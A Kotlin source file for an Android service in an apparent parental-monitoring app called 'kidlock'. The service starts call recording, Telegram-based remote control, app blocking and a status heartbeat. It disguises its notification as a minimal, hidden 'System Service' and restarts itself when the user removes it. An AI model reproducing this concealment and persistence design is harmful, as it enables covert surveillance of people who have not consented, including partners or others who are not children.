package com.kidlock

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.*
import androidx.core.app.NotificationCompat

class ChildService : Service() {

    private lateinit var telegramListener: TelegramListener
    private lateinit var callRecorder: CallRecorder
    private lateinit var scheduleManager: ScheduleManager

    companion object {
        const val CHANNEL_ID = "kidlock_service"
        const val NOTIF_ID = 1001
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())

        telegramListener = TelegramListener(this)
        TelegramListener.instance = telegramListener
        telegramListener.startPolling()

        callRecorder = CallRecorder(this)
        callRecorder.start()

        scheduleManager = ScheduleManager(this)
        scheduleManager.startChecking()

        AppBlocker.startMonitoring(this)
        StatusReporter.startHeartbeat(this)

        // notify dad phone is online
        telegramListener.sendMessage("✅ Phone online.")
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restart = Intent(applicationContext, ChildService::class.java)
        val pi = PendingIntent.getService(
            applicationContext, 1, restart,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager)
            .set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pi)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        super.onDestroy()
        telegramListener.stopPolling()
        callRecorder.stop()
    }
}
